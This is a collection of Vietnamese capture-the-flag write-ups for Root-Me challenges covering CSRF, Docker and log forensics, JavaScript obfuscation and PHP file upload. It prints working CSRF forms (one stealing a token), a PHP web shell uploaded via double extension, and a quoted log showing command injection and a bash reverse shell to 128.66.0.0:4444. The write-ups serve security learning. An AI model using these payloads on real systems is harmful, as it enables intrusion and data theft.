<p>T·ª´ ƒë√≥, ta c√≥ th·ªÉ ƒëo√°n ra r·∫±ng, n·ªôi dung ·ªü tab Contact s·∫Ω ƒë∆∞·ª£c post l√™n v√† ƒë∆∞·ª£c admin ki·ªÉm duy·ªát Admin c√≥ th·ªÉ click v√†o message c·ªßa ta C√≥ th·ªÉ t·∫•n c√¥ng CSRF.</p>
<p>ƒê·ªÉ xem ƒë∆∞·ª£c tab Private, ta c·∫ßn ph·∫£i x√°c th·ª±c ƒë∆∞·ª£c Profile v√† t·ª´ ƒë√≥ ta c√≥ th·ªÉ ƒëo√°n ƒë∆∞·ª£c √Ω ƒë·ªì c·ªßa vi·ªác disable c·ªßa n√∫t Status l√† c√≥ l√Ω do c·ªßa n√≥. Tuy v·∫≠y, ch·ªâ c√≥ admin m·ªõi c√≥ th·ªÉ x√°c th·ª±c account. K·∫øt h·ª£p v·ªõi suy lu·∫≠n ·ªü tr√™n, ta c√≥ th·ªÉ th·ª±c hi·ªán CSRF gi·∫£ m·∫°o g·ª≠i content ƒë·∫øn cho admin v√† khi·∫øn script ch·∫°y ƒë·ªÉ admin submit form cho ta.</p>
<p>Qua tab Profile, inspect element v√† th·ª±c hi·ªán gi·∫£ m·∫°o m·ªôt form t∆∞∆°ng t·ª± form ·ªü tab Profile. Sau ƒë√≥, ch√®n th√™m script ƒë·ªÉ admin c√≥ th·ªÉ submit form:</p>
<pre><code class="language-html">&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;&lt;/form&gt;

&lt;input type="text" name="username" value="19522445"&gt;

&lt;input type="checkbox" name="status" checked&gt;

&lt;/form&gt;

&lt;script&gt;document.getElementById("clickme").submit();&lt;/script&gt;
</code></pre>
<p><img src="CSRF/CSRF0protection/./media/image5.png" alt="" /></p>
<p>Submit ƒë·ªÉ g·ª≠i contact ƒë·∫øn admin v√† qua tab Private ƒë·ªÉ ki·ªÉm tra k·∫øt qu·∫£. Sau h∆°n 1 ph√∫t, ta nh·∫≠n ƒë∆∞·ª£c flag:</p>
<p><img src="CSRF/CSRF0protection/./media/image6.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf--token-bypass"><a class="header" href="#csrf--token-bypass"><a href="https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass">CSRF ‚Äì token bypass</a></a></h1>
<p>Nh√¨n qua, ta th·∫•y website n√†y c√≥ c√°c ch·ª©c nƒÉng t∆∞∆°ng t·ª± b√†i CSRF 0 protection. Tuy v·∫≠y, ta c√≥ th·ªÉ ph√°t hi·ªán ƒë∆∞·ª£c ·ªü tab Contact, c√≥ m·ªôt th·∫ª input b·ªã hidden c√≥ name l√† token:</p>
<p><img src="CSRF/CSRFtokenbypass/./media/image1.png" alt="" /></p>
<p>Gi√° tr·ªã token n√†y s·∫Ω thay ƒë·ªïi li√™n t·ª•c khi ta th·ª±c hi·ªán submit form:</p>
<p><img src="CSRF/CSRFtokenbypass/./media/image2.png" alt="" /></p>
<p>ƒêi·ªÅu n√†y s·∫Ω ƒë∆∞·ª£c x√°c th·ª±c b·ªüi server. T·ª´ ƒë√≥, ta c·∫ßn tr·ªôm token n√†y tr∆∞·ªõc khi submit form nh∆∞ b√†i CSRF 0 protection. Ta c√≥ th·ªÉ s·ª≠ d·ª•ng Ajax v√† XMLHttpRequest() ƒë·ªÉ c√≥ th·ªÉ get ƒë∆∞·ª£c value n√†y.</p>
<pre><code class="language-html">&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data"&gt;

&lt;input type="text" name="username" value="19522445"&gt;

&lt;input type="checkbox" name="status" checked&gt;

&lt;input id="token" type="hidden" name="token" value=""/&gt;

&lt;button type="submit"&gt;Submit&lt;/button&gt;

&lt;/form&gt;

&lt;script&gt;

var req = new XMLHttpRequest();

req.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);

req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

req.send();

var token = req.responseText.match(/\[abcdef0123456789\]{32}/);

document.getElementById("token").value = token;

document.getElementById("clickme").submit();

&lt;/script&gt;
</code></pre>
<p><img src="CSRF/CSRFtokenbypass/./media/image3.png" alt="" /></p>
<p>Submit ƒë·ªÉ g·ª≠i contact ƒë·∫øn admin v√† qua tab Private ƒë·ªÉ ki·ªÉm tra k·∫øt qu·∫£. Sau h∆°n 1 ph√∫t, ta nh·∫≠n ƒë∆∞·ª£c flag:</p>
<p><img src="CSRF/CSRFtokenbypass/./media/image4.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="forensics-challenges"><a class="header" href="#forensics-challenges">Forensics Challenges</a></h1>
<p>Write-ups for Root Me Forensics challenges, focusing on digital investigation, data recovery, and analysis techniques.</p>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>Docker layer</td><td><a href="Forensics/./Docker-layer/Docker-layer.html">Read more</a></td></tr>
<tr><td>Open My Vault</td><td><a href="Forensics/./Open-My-Vault/Open-My-Vault.html">Read more</a></td></tr>
</tbody></table>
</div>
<blockquote>
<p>üí° Each folder contains step-by-step solutions, screenshots, and tools used.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="docker-layers"><a class="header" href="#docker-layers"><a href="https://www.root-me.org/fr/Challenges/Forensic/Docker-layers">Docker layers</a></a></h1>
<p>S·ª≠ d·ª•ng <code>container-diff</code> ƒë·ªÉ analyze history c·ªßa file <code>.tar</code></p>
<pre><code class="language-bash">container-diff analyze -t history ch29.tar

-----History-----

Analysis for ch29.tar:
-/bin/sh -c #(nop) ADD file:d2abf27fe2e8b0b5f4da68c018560c73e11c53098329246e3e6fe176698ef941 in /
-/bin/sh -c #(nop)  CMD ["bash"]
-/bin/sh -c apt update -y
-/bin/sh -c apt install -y curl openssl
-/bin/sh -c #(nop) COPY file:2ca89eb39686ffcc3d2d87bbc9293559252cff471f80c2ed5d024b214f9a6fa3 in /
-/bin/sh -c echo -n $(curl -s https://pastebin.com/raw/P9Nkw866) | openssl enc -aes-256-cbc -iter 10 -pass pass:$(cat /pass.txt) -out flag.enc
-/bin/sh -c rm /pass.tx
</code></pre>
<p>Ta th·∫•y, t√°c gi·∫£ s·ª≠ d·ª•ng encrypt file flag l·∫•y t·ª´ https://pastebin.com/raw/P9Nkw866 (not found) v√† encrypt v·ªõi password ƒë∆∞·ª£c mount t·∫°i /pass.txt t·ª´ m·ªôt file local.</p>
<p>Gi·ªù th√¨ untar file <code>ch29.tar</code> ra v√† t√¨m ki·∫øm flag:</p>
<pre><code class="language-bash"> 1bbd61a572ad5f5e2ac0f073465d10dc1c94a71359b0adfd2c105be4c1cb2507
 316bbb8c58be42c73eefeb8fc0fdc6abb99bf3d5686dd5145fc7bb2f32790229.tar
 3309d6da2bd696689a815f55f18db3f173bc9b9a180e5616faf4927436cf199d.tar
 4942a1abcbfa1c325b1d7ed93d3cf6020f555be706672308a4a4a6b6d631d2e7.tar
 5bcc45940862d5b93517a60629b05c844df751c9187a293d982047f01615cb30
 743c70a5f809c27d5c396f7ece611bc2d7c85186f9fdeb68f70986ec6e4d165f.tar
 82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d
 8d364403e7bf70d7f57e807803892edf7304760352a397983ecccb3e76ca39fa.tar
 8f0d75885373613641edc42db2a0007684a0e5de14c6f854e365c61f292f3b4d
 b324f85f8104bfebd1ed873e90437c0235d7a43f025a047d5695fe461da717c6.json
 b58c5e8ccaba8886661ddd3b315989f5cf7839ea06bbe36547c6f49993b0d0aa.tar
 ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16
 db04fe239ab708e4ab56ea0e5c1047449b7ea9e04df9db5b1b95d00c6980ff3f
 flag.enc
 manifest.json
 openssl
 repositories
</code></pre>
<p>Unzip ti·∫øp c√°c file <code>.tar</code> c√≤n l·∫°i s·∫Ω xu·∫•t hi·ªán file <code>flag.enc</code> v√† <code>pass.txt</code>:</p>
<pre><code class="language-bash">cat pass.txt
d4428185a6202a1c5806d7cf4a0bb738a05c03573316fe18ba4eb5a21a1bc8ea
</code></pre>
<pre><code class="language-bash">cat flag.enc
Salted__s`;?ÔøΩdÔøΩqÔøΩÔøΩÔøΩ/ÔøΩ!ÔøΩÔøΩÔøΩÔøΩ$@ÔøΩÔøΩÔøΩÔøΩÔøΩ8ÔøΩ=NK:ÔøΩEÔøΩn%ÔøΩÔøΩÔøΩ.NÔøΩÔøΩ02)ÔøΩd
</code></pre>
<p>S·ª≠ d·ª•ng <code>openssl</code> ƒë·ªÉ descrypt <code>flag.enc</code>:</p>
<pre><code class="language-bash">openssl enc -aes-256-cbc -iter 10 -d -in flag.enc -out flag.txt
</code></pre>
<p>V√† nh·∫≠n flag: <code>cat flag.txt *******************</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="open-my-vault"><a class="header" href="#open-my-vault">O<a href="https://www.root-me.org/en/Challenges/Forensic/Open-My-Vault">pen My Vault</a></a></h1>
<p>Sau khi ssh v√†o server, ta ki·ªÉm tra history c·ªßa user:</p>
<pre><code class="language-bash">    1  id
    2  cat /etc/passwd
    3  pwd
    4  cd /home/m4st3r/
    5  ping 128.66.0.0
    6  cat /etc/shadow
    7  l
    8  ll
    9  cd ansible/
   10  ls -lah
   11  tree .
   12  cat inventory.cfg
   13  cat playbook.yml
   14  cat roles/zip/tasks/main.yml
   15  mkdir roles/other
   16  mkdir roles/other/tasks
   17  ansible-vault -h
   18  ansible-vault create roles/other/tasks/main.yml
   19  vim playbook.yml
   20  ansible-playbook -h
   21  ansible-playbook -i inventory.cfg --vault-password-file=/tmp/.secure playbook.yml
   22  rm /tmp/.secure
</code></pre>
<p>·ªû d√≤ng 21, m4st3r ƒë√£ ch·∫°y m·ªôt playbook ƒë√£ m√£ h√≥a v·ªõi password n·∫±m ·ªü <code>/tmp/.secure</code> v√† sau ƒë√≥ anh ·∫•y ƒë√£ x√≥a n√≥ v·ªõi <code>rm /tmp/.secure</code></p>
<p>Th·ª≠ ch·∫°y l·∫°i d√≤ng 21, k·∫øt qu·∫£ tr·∫£ v·ªÅ l√† kh√¥ng th·ªÉ v√¨ thi·∫øu ssh-key</p>
<p>Gi·ªù th√¨ check th·ª≠ <code>/var/log</code> ta c√≥:</p>
<pre><code class="language-bash">ll /var/log/
total 712
drwxr-xr-x 1 root root              4096 Dec  4 11:53 ./
drwxr-xr-x 1 root root              4096 Dec  4 11:53 ../
-rw-r--r-- 1 root root             13764 Dec  4 11:56 alternatives.log
drwxr-xr-x 1 root adm               4096 Dec  4 12:05 apache2/
drwxr-xr-x 1 root root              4096 Dec  4 11:53 apt/
-rw-r--r-- 1 root root             58592 Sep 22 16:47 bootstrap.log
-rw-rw---- 1 root utmp                 0 Sep 22 16:47 btmp
-rw-r--r-- 1 root root            284658 Dec  4 11:56 dpkg.log
-rw-r--r-- 1 root root             32032 Dec  4 12:05 faillog
drwxr-sr-x 2 root systemd-journal   4096 Dec  4 11:53 journal/
-rw-rw-r-- 1 root utmp            292292 Dec 11 08:17 lastlog
drwx------ 2 root root              4096 Dec  4 11:53 private/
-rw-rw-r-- 1 root utmp               384 Dec 11 08:17 wtmp
</code></pre>
<p>Okay, gi·ªù th√¨ check log theo th·ª© t·ª± ∆∞u ti√™n l√† syslog -&gt; weblog. ƒê√∫ng l√† anh ·∫•y ƒë√£ qu√™n x√≥a log. ·ªû <code>/var/log/apache2/access.log</code> ta t√¨m ƒë∆∞·ª£c th·ª© n√†y:</p>
<pre><code class="language-bash">203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] "GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
203.0.113.0 - - [03/Sep/2022:13:34:57 +0200] "GET /pdf.php?name=a.pdf;bash%20-i%20%3E&amp;%20/dev/tcp/128.66.0.0/4444%200%3E&amp;1 HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
</code></pre>
<p>Th·ª© n√†y gi·ªëng nh∆∞ website ƒë√£ b·ªã ch√®n shell. Decode v·ªõi URL decode ta ƒë∆∞·ª£c:</p>
<pre><code class="language-bash">echo "C4tXk9ctpG9QEMeL" &gt; /tmp/.secure
bash -i &gt;&amp; /dev/tcp/128.66.0.0/4444 0&gt;&amp;1
</code></pre>
<p>V·∫≠y l√† ta ƒë√£ t√¨m ƒë∆∞·ª£c <code>.secure</code> password c·ªßa vault. Gi·ªù th√¨ decrypt n√≥ :</p>
<pre><code class="language-bash">echo "C4tXk9ctpG9QEMeL" &gt; /tmp/.secure
ansible-vault decrypt --vault-pass-file /tmp/.secure roles/other/tasks/main.yml
Decryption successful
...
cat roles/other/tasks/main.yml
- name: "hack the planet"
  ansible.builtin.shell: "bash -i &gt;&amp; /dev/tcp/128.66.0.0/4444 0&gt;&amp;1"

- name: "If someone search for a Flag ^^"
  ansible.builtin.shell: "echo '************' &gt; /flag"
</code></pre>
<p>^^</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript-challenges"><a class="header" href="#javascript-challenges">Javascript Challenges</a></h1>
<p>Root Me challenges focused on Javascript logic, obfuscation, and source code analysis.</p>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>HTML - disabled buttons</td><td><a href="Javascript/./HTML-disabledbuttons/HTML-disabledbuttons.html">Read more</a></td></tr>
<tr><td>Javascript - Authentication</td><td><a href="Javascript/./Javascript-Authentication/Javascript-Authentication.html">Read more</a></td></tr>
<tr><td>Javascript - Authentication 2</td><td><a href="Javascript/./Javascript-Authentication2/Javascript-Authentication2.html">Read more</a></td></tr>
<tr><td>Javascript - Native code</td><td><a href="Javascript/./Javascript-Nativecode/Javascript-Nativecode.html">Read more</a></td></tr>
<tr><td>Javascript - Obfuscation 1</td><td><a href="Javascript/./Javascript-Obfuscation1/Javascript-Obfuscation1.html">Read more</a></td></tr>
<tr><td>Javascript - Obfuscation 2</td><td><a href="Javascript/./Javascript-Obfuscation2/Javascript-Obfuscation2.html">Read more</a></td></tr>
<tr><td>Javascript - Obfuscation 3</td><td><a href="Javascript/./Javascript-Obfuscation3/Javascript-Obfuscation3.html">Read more</a></td></tr>
<tr><td>Javascript - Source</td><td><a href="Javascript/./Javascript-Source/Javascript-Source.html">Read more</a></td></tr>
</tbody></table>
</div>
<blockquote>
<p>üí° See each folder for code, explanations, and screenshots.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---authentication"><a class="header" href="#javascript---authentication"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Authentication">Javascript - Authentication</a></a></h1>
<p>Ki·ªÉm tra website, ta th·∫•y ·ªü ph·∫ßn Elements kh√¥ng c√≥ g√¨ kh√°c bi·ªát:</p>
<p><img src="Javascript/Javascript-Authentication/./media/image1.png" alt="" /></p>
<p>Chuy·ªÉn qua ph·∫ßn Sources, ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c file login.js v·ªõi n·ªôi dung:</p>
<p><img src="Javascript/Javascript-Authentication/./media/image2.png" alt="" /></p>
<p>C√≥ nghƒ©a, khi nh·∫≠p ƒë√∫ng <strong>pseudo=="4dm1n" &amp;&amp; password=="sh.org"</strong> th√¨ s·∫Ω nh·∫≠n ƒë∆∞·ª£c alert th√†nh c√¥ng (c≈©ng kh√¥ng c√≥ g√¨ kh√°c bi·ªát). Do ƒë√≥, ta th·ª≠ nh·∫≠p password (flag) v·ªõi gi√° tr·ªã l√† <strong>sh.org</strong> th√¨ th·∫•y ƒë√£ t√¨m ƒë∆∞·ª£c ƒë√∫ng password.</p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---authentication-2"><a class="header" href="#javascript---authentication-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Authentication-2">Javascript - Authentication 2</a></a></h1>
<p>V√†o website, ta th·∫•y c√≥ m·ªôt n√∫t login v√† m·ªôt th·∫ª &lt;a&gt; ƒë·ªÉ ƒë√≥ng c·ªßa s·ªï:</p>
<p><img src="Javascript/Javascript-Authentication2/./media/image1.png" alt="" /></p>
<p>Click v√†o login button, website s·∫Ω hi·ªán 2 √¥ alert l·∫ßn l∆∞·ª£t l√† <code>username</code> v√† <code>password</code>. Ki·ªÉm tra Sources website, ta th·∫•y c√≥ file <code>login.js</code>:</p>
<p><img src="Javascript/Javascript-Authentication2/./media/image2.png" alt="" /></p>
<p>Ta th·∫•y, script so s√°nh <code>username == TheUsername &amp;&amp; password == ThePassword</code>. Trong khi ƒë√≥ <code>TheUsername</code> v√† ThePassword l·∫ßn l∆∞·ª£t l√† <code>TheSplit[0]</code> v√† <code>TheSplit[1]</code>. T·ª´ ƒë√≥ v·ªõi <code>var TheLists = ["GOD:HIDDEN"]</code>, ta c√≥ th·ªÉ suy ra:</p>
<pre><code class="language-yaml">Username: GOD
Password: HIDDEN
</code></pre>
<p><img src="Javascript/Javascript-Authentication2/./media/image3.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---native-code"><a class="header" href="#javascript---native-code"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Native-code">Javascript - Native code</a></a></h1>
<p>Ki·ªÉm tra Sources website, ta th·∫•y c√≥ file ch16.html:</p>
<p><img src="Javascript/Javascript-Nativecode/./media/image1.png" alt="" /></p>
<p>S·ª≠ d·ª•ng c√¥ng c·ª• <a href="https://www.dcode.fr/javascript-unobfuscator">Javascript Unobfuscator</a> ƒë·ªÉ decrypt ƒëo·∫°n m√£ tr√™n, ta ƒë∆∞·ª£c:</p>
<p><img src="Javascript/Javascript-Nativecode/./media/image2.png" alt="" /></p>
<p>T·ª´ ƒë√≥, d·ªÖ d√†ng suy ƒëo√°n ƒë∆∞·ª£c, <code>password = "****************************"</code></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-2"><a class="header" href="#javascript---obfuscation-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-2">Javascript - Obfuscation 2</a></a></h1>
<p>Ki·ªÉm tra Sources website, ta th·∫•y c√≥ file ch12.html:</p>
<p><img src="Javascript/Javascript-Obfuscation1/./media/image1.png" alt="" /></p>
<p>Ta th·∫•y, pass l√∫c n√†y ƒë∆∞·ª£c g√°n b·∫±ng m·ªôt d√≤ng l·ªánh Javascript. L√∫c n√†y, ta s·∫Ω th·ª≠ qua Console v√† ch·∫°y c√°c l·ªánh n√†y:</p>
<p><img src="Javascript/Javascript-Obfuscation1/./media/image2.png" alt="" /></p>
<p>L√∫c n√†y, c√≥ v·∫ª nh∆∞ ta ƒë√£ t√¨m ƒë∆∞·ª£c password.</p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-1"><a class="header" href="#javascript---obfuscation-1"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-1">Javascript - Obfuscation 1</a></a></h1>
<p>V√†o website, website y√™u c·∫ßu nh·∫≠p password:</p>
<p><img src="Javascript/Javascript-Obfuscation2/./media/image1.png" alt="" /></p>
<p>Ki·ªÉm tra Sources website, ta th·∫•y c√≥ file <code>ch4.html</code>:</p>
<p><img src="Javascript/Javascript-Obfuscation2/./media/image2.png" alt="" /></p>
<p>Ta th·∫•y: <code>pass ='%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64'</code></p>
<p>ƒê√¢y l√† chu·ªói hex, ta convert sang ASCII Text v√† c√≥ ƒë∆∞·ª£c password:</p>
<p><img src="Javascript/Javascript-Obfuscation2/./media/image3.png" alt="" /></p>
<p><img src="Javascript/Javascript-Obfuscation2/./media/image4.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-3"><a class="header" href="#javascript---obfuscation-3"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-3">Javascript - Obfuscation 3</a></a></h1>
<p>Ki·ªÉm tra Sources website, ta th·∫•y c√≥ file <code>ch13.html</code>:</p>
<p><img src="Javascript/Javascript-Obfuscation3/./media/image1.png" alt="" /></p>
<p>Decode chu·ªói ·ªü bi·∫øn pass, ta nh·∫≠n ƒë∆∞·ª£c k·∫øt qu·∫£ <code>FAUX PASSWORD HAHA</code>. ƒê·ªçc l·∫°i code, ta th·∫•y, ·ªü d√≤ng 21, script c√≥ s·ª≠ d·ª•ng h√†m <code>dechiffre()</code> ƒë·ªÉ decode m·ªôt ƒëo·∫°n chu·ªói gi√° tr·ªã lo·∫°i hex. Ta s·ª≠ d·ª•ng c√¥ng c·ª• ASCII Code ƒë·ªÉ decrypt n√≥ v√† ƒë∆∞·ª£c:</p>
<p><img src="Javascript/Javascript-Obfuscation3/./media/image2.png" alt="" /></p>
<p>Ta nh·∫≠n ƒë∆∞·ª£c chu·ªói <code>‚Äú55,56,54,79,115,69,114,116,107,49,50‚Äù</code>. Chu·ªói n√†y c√≥ format gi·ªëng chu·ªói ·ªü bi·∫øn pass, ta decode n√≥ m·ªôt l·∫ßn n·ªØa v·ªõi c√¥ng c·ª• ASCII Code v√† ƒë∆∞·ª£c:</p>
<p><img src="Javascript/Javascript-Obfuscation3/./media/image3.png" alt="" /></p>
<p>T·ª´ ƒë√≥, ta suy ƒëo√°n ƒë∆∞·ª£c, <code>password = '****************'</code></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---source"><a class="header" href="#javascript---source"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Source">Javascript - Source</a></a></h1>
<p>V√†o website, ta th·∫•y c√≥ m·ªôt √¥ alert hi·ªán ra b·∫Øt ta nh·∫≠p m·∫≠t kh·∫©u:</p>
<p><img src="Javascript/Javascript-Source/./media/image1.png" alt="" /></p>
<p>Ki·ªÉm tra Sources c·ªßa website, ta th·∫•y m·ªôt file (index):</p>
<p><img src="Javascript/Javascript-Source/./media/image2.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, ta c√≥ th·ªÉ th·∫•y, body s·∫Ω s·ª≠ d·ª•ng event onload ƒë·ªÉ ch·∫°y h√†m <code>login()</code>, h√†m <code>login()</code> s·∫Ω so s√°nh password v·ªõi chu·ªói <code>"123456azerty"</code>, do ƒë√≥, ta s·∫Ω s·ª≠ d·ª•ng chu·ªói n√†y ƒë·ªÉ nh·∫≠p v√†o √¥ alert ban ƒë·∫ßu c≈©ng nh∆∞ v√†o password c·ªßa challenge.</p>
<p><img src="Javascript/Javascript-Source/./media/image3.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php-challenges"><a class="header" href="#php-challenges">PHP Challenges</a></h1>
<p>Write-ups for Root Me PHP security challenges. Each guide explains the vulnerability, exploitation steps, and key takeaways for educational purposes.</p>
<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
<tr><td>Directory Traversal</td><td><a href="PHP/./DirectoryTraversal/DirectoryTraversal.html">Read more</a></td></tr>
<tr><td>File upload - Double extensions</td><td><a href="PHP/./Fileupload-Doubleextensions/Fileupload-Doubleextensions.html">Read more</a></td></tr>
<tr><td>File upload - MIME type</td><td><a href="PHP/./Fileupload-MIMEtype/Fileupload-MIMEtype.html">Read more</a></td></tr>
<tr><td>HTTP - Directory indexing</td><td><a href="PHP/./HTTP-Directoryindexing/HTTP-Directoryindexing.html">Read more</a></td></tr>
<tr><td>Local File Inclusion</td><td><a href="PHP/./LocalFileInclusion/LocalFileInclusion.html">Read more</a></td></tr>
<tr><td>Local File Inclusion - Double Encoding</td><td><a href="PHP/./LocalFileInclusion-DoubleEncoding/LocalFileInclusion-DoubleEncoding.html">Read more</a></td></tr>
<tr><td>Local File Inclusion - Wrappers</td><td><a href="PHP/./LocalFileInclusion-Wrappers/LocalFileInclusion-Wrappers.html">Read more</a></td></tr>
<tr><td>PHP - assert()</td><td><a href="PHP/./PHP-assert()/PHP-assert().html">Read more</a></td></tr>
<tr><td>PHP - Filters</td><td><a href="PHP/./PHP-Filters/PHP-Filters.html">Read more</a></td></tr>
<tr><td>PHP - register global</td><td><a href="PHP/./PHP-registerglobal/PHP-registerglobal.html">Read more</a></td></tr>
<tr><td>Remote File Inclusion</td><td><a href="PHP/./RemoteFileInclusion/RemoteFileInclusion.html">Read more</a></td></tr>
</tbody></table>
</div>
<blockquote>
<p>üí° Explore each folder for detailed explanations and screenshots.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="directory-traversal"><a class="header" href="#directory-traversal"><a href="https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal">Directory Traversal</a></a></h1>
<p><img src="PHP/DirectoryTraversal/./media/image1.png" alt="" /></p>
<p>Th·ª≠ t√¨m c√°c h√¨nh ·∫£nh ·ªü c√°c tab, kh√¥ng ph√°t hi·ªán ƒëi·ªÅu g√¨ kh√°c bi·ªát. Ch√∫ √Ω ƒë·∫øn <strong>URL</strong> <a href="http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes</a> c√≥ <em>galerie=[value].</em> Ta th·ª≠ x√≥a ƒëi value ƒë·ªÉ website tr·∫£ v·ªÅ d·∫°ng ‚Äòindex‚Äô:</p>
<p><img src="PHP/DirectoryTraversal/./media/image2.png" alt="" /></p>
<p>L√∫c n√†y, website tr·∫£ v·ªÅ m·ªôt <strong>alt=‚Äú86hwnX2r‚Äù.</strong> Ch·ªçn <strong>‚ÄúOpen image in new window‚Äù</strong> th√¨ nh·∫≠n ƒë∆∞·ª£c <code>403 Forbidden</code>:</p>
<p><img src="PHP/DirectoryTraversal/./media/image3.png" alt="" /></p>
<p>C√≥ l·∫Ω galerie l√∫c n√†y ph·∫£i l√† <code>null</code> ho·∫∑c b·∫±ng value n√†o ƒë√≥. Ta back v·ªÅ <code>ch15.php</code> source web v√† add v√†o source link c·ªßa ·∫£nh ƒë√≥ <a href="http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r</a> ta chuy·ªÉn ƒë·∫øn trang kh√°c:</p>
<p><img src="PHP/DirectoryTraversal/./media/image4.png" alt="" /></p>
<p>·∫¢nh password ƒë√£ xu·∫•t hi·ªán, truy c·∫≠p source password v√† nh·∫≠n password <a href="https://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt">https://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt</a></p>
<p><img src="PHP/DirectoryTraversal/./media/image5.png" alt="" /></p>
<p><img src="PHP/DirectoryTraversal/./media/image6.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload--double-extensions"><a class="header" href="#file-upload--double-extensions"><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions">File upload ‚Äì Double extensions</a></a></h1>
<p>ƒê·∫ßu ti√™n, ta ki·ªÉm tra th·ª≠ xem password c·ªßa admin s·∫Ω n·∫±m ·ªü ƒë√¢u. Th·ª≠ t√¨m ki·∫øm t·∫°i .passwd file th√¨ nh·∫≠n ƒë∆∞·ª£c l·ªói <code>403 Forbidden</code>. C√≥ file n√†y nh∆∞ng b·ªã gi·ªõi h·∫°n access:</p>
<p><img src="PHP/Fileupload-Doubleextensions/./media/image1.png" alt="" /></p>
<p>Ti·∫øp theo, ta s·∫Ω m·ªü c·ªïng upload c·ªßa server, ta c√≥ th·ªÉ upload c√°c file image (jpeg/png/gif):</p>
<p><img src="PHP/Fileupload-Doubleextensions/./media/image2.png" alt="" /></p>
<p>Nh∆∞ v·∫≠y, ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c <code>.passwd</code>, ta c·∫ßn ph·∫£i ƒëi ng∆∞·ª£c folder 3 l·∫ßn V·ªã tr√≠ .passwd n·∫±m t·∫°i <code>../../../.passwd</code></p>
<p>ƒê·ªÉ ƒë·ªçc ƒë∆∞·ª£c <code>.passwd</code>, ta th·ª≠ s·ª≠ d·ª•ng c·ªïng n√†y ƒë·ªÉ upload file .php l√™n server v√† bu·ªôc server s·ª≠ d·ª•ng <code>shell_exec()</code> ƒë·ªÉ th·ª±c thi shell:</p>
<pre><code class="language-php">&lt;?php  
$output¬†=¬†shell_exec('cat ../../../.passwd');  
echo¬†"&lt;pre&gt;$output&lt;/pre&gt;";  
?&gt;
</code></pre>
<p>ƒê·ªÅ b√†i ƒë√£ g·ª£i √Ω cho ta s·ª≠ d·ª•ng Double Extensions, do ƒë√≥, th·ª≠ rename file <code>.php</code> --&gt; <code>.php.jpg</code> v√† upload:</p>
<p><img src="PHP/Fileupload-Doubleextensions/./media/image3.png" alt="" /></p>
<p>Upload th√†nh c√¥ng, truy c·∫≠p link v√† nh·∫≠n password:</p>
